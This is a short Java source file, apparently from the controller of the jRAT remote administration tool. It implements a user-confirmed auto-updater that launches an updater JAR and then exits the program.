package io.jrat.controller;

import io.jrat.common.downloadable.JavaArchive;
import java.io.File;
import javax.swing.JOptionPane;

public class Updater {

	public static void runUpdater() {
		try {
			if (!new File("Controller.jar").exists()) {
				JOptionPane.showMessageDialog(null, "Auto updating is for JAR installation only", "Updater", JOptionPane.ERROR_MESSAGE);
				return;
			}
			
			if (JOptionPane.showConfirmDialog(null, "Updating will close jRAT,  delete all files, and download and extract the new update\nDo you want to proceed?", "Update", JOptionPane.YES_NO_CANCEL_OPTION) == JOptionPane.YES_OPTION) {
				JavaArchive.executeJAR(Globals.getUpdater());
				
				System.exit(0);
			}
		} catch (Exception e) {
			e.printStackTrace();
			ErrorDialog.create(e);
		}
	}

}
